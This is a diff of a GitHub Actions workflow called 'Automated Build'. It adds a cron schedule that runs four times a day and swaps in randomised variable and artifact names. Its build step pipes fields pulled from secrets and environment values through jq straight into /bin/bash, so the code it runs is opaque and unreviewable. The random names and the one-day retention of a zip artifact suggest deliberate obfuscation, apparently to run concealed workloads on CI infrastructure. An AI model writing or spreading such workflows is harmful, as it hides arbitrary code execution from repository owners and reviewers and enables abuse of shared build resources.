@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 5,11,17,23 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          on1516: ${{ secrets.on1516 }}
+          jazr66580: ${{ secrets.jazr66580 }}
         run: |
-          printf '%s' "$on1516" | jq -r .mio8480 | /bin/bash
-          printf '%s' "$l730" | jq -r .mabdi5 | /bin/bash
-          printf '%s' "$my80" | jq -r .tcs956 | /bin/bash
-          printf '%s' "$nzhr6142" | jq -r .cg33759 | /bin/bash
+          printf '%s' "$jazr66580" | jq -r .caim2 | /bin/bash
+          printf '%s' "$tgofe90601" | jq -r .g858 | /bin/bash
+          printf '%s' "$zryhg4289" | jq -r .j4 | /bin/bash
+          printf '%s' "$syhb1" | jq -r .uzb1150 | /bin/bash
+          echo $pw427 | jq -r .oig976 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: 3tEoykUe
+          name: Guv8NvZD
           path: "*.zip"
           retention-days: 1
